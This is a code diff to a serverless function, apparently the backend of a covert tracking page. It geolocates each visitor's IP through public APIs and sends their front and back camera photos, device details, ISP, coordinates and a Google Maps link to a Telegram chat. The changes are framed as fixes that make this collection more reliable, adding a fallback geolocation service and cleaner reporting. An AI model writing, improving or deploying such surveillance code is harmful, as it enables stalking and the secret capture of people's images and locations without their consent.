@@ -1,4 +1,4 @@
-// api/tele-proxy.js
+// api/tele-proxy.js - PHIÊN BẢN FIXED
 export const config = { runtime: "edge" };
 
 export default async function handler(req) {
@@ -11,13 +11,56 @@ export default async function handler(req) {
   try {
     // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ TỪ SERVER
     const userIP =
-      req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
-    const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
-    const geo = await geoRes.json();
+      req.headers.get("x-forwarded-for")?.split(",")[0].trim() || 
+      req.headers.get("cf-connecting-ip") ||
+      "Unknown";
 
-    const lat = geo.latitude || "0";
-    const lon = geo.longitude || "0";
-    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
+    let lat = "0";
+    let lon = "0";
+    let city = "Unknown";
+    let region = "Unknown";
+    let country = "Unknown";
+    let isp = "VNNIC";
+
+    // TRY: API ipapi.co (RECOMMENDED - Tốt nhất)
+    if (userIP !== "Unknown") {
+      try {
+        const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`, {
+          headers: { "Accept": "application/json" },
+        });
+        
+        if (geoRes.ok) {
+          const geo = await geoRes.json();
+          lat = String(geo.latitude || "0");
+          lon = String(geo.longitude || "0");
+          city = geo.city || "Unknown";
+          region = geo.region || "Unknown";
+          country = geo.country_name || "Unknown";
+          isp = geo.org || "Unknown";
+        }
+      } catch (e) {
+        console.log("ipapi.co failed, trying ip-api.com...");
+        
+        // FALLBACK: API ip-api.com
+        try {
+          const geoRes = await fetch(`https://ip-api.com/json/${userIP}?fields=lat,lon,city,regionName,country,isp`);
+          
+          if (geoRes.ok) {
+            const geo = await geoRes.json();
+            if (geo.status === "success") {
+              lat = String(geo.lat || "0");
+              lon = String(geo.lon || "0");
+              city = geo.city || "Unknown";
+              region = geo.regionName || "Unknown";
+              country = geo.country || "Unknown";
+              isp = geo.isp || "Unknown";
+            }
+          }
+        } catch (e2) {
+          console.log("All geo APIs failed:", e2.message);
+        }
+      }
+    }
 
     // 2. NHẬN DỮ LIỆU TỪ CLIENT
     const contentType = req.headers.get("content-type") || "";
@@ -49,6 +92,10 @@ export default async function handler(req) {
       );
     }
 
+    // ✅ FIXED: Google Maps URL đúng + Format lại vĩ độ/kinh độ
+    const googleMapsUrl = `https://www.google.com/maps/search/${lat},${lon}/@${lat},${lon},15z`;
+    const address = `${city}, ${region}, ${country}`;
+
     // 4. TẠO CAPTION KHI CÓ ẢNH
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]
@@ -57,12 +104,12 @@ export default async function handler(req) {
 📱 Thiết bị: ${clientData.device || "Unknown"}
 🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
 🌍 IP dân cư: ${userIP}
-🏢 ISP: ${geo.asName || "VNNIC"}
+🏢 ISP/Nhà mạng: ${isp}
 🏙️ Địa chỉ: ${address}
-🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
-📍 Vĩ độ: ${lat}
-📍 Kinh độ: ${lon}
-📌 Google Maps: http://googleusercontent.com/maps.google.com/${lat},${lon}
+🌎 Quốc gia: ${country}
+📍 Vĩ độ (Latitude): ${lat}
+📍 Kinh độ (Longitude): ${lon}
+📌 Google Maps: ${googleMapsUrl}
 📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
@@ -79,6 +126,7 @@ export default async function handler(req) {
         type: "photo",
         media: "attach://front",
         caption: finalCaption,
+        parse_mode: "HTML",
       });
       teleForm.append("front", formData.get("front"));
     }
@@ -88,7 +136,7 @@ export default async function handler(req) {
       media.push({
         type: "photo",
         media: "attach://back",
-        caption: !hasFront ? finalCaption : undefined,
+        caption: !hasFront ? finalCaption : "",
       });
       teleForm.append("back", formData.get("back"));
     }
@@ -103,10 +151,30 @@ export default async function handler(req) {
       },
     );
 
-    return new Response(await res.text(), { status: 200 });
+    const teleResult = await res.text();
+    
+    return new Response(
+      JSON.stringify({
+        success: res.ok,
+        message: res.ok ? "Sent to Telegram successfully" : "Telegram API error",
+        ip: userIP,
+        location: { lat, lon, city, region, country },
+      }),
+      { 
+        status: res.ok ? 200 : 400,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
   } catch (err) {
-    return new Response(JSON.stringify({ error: err.message }), {
-      status: 500,
-    });
+    return new Response(
+      JSON.stringify({ 
+        error: err.message,
+        success: false 
+      }),
+      {
+        status: 500,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
   }
 }
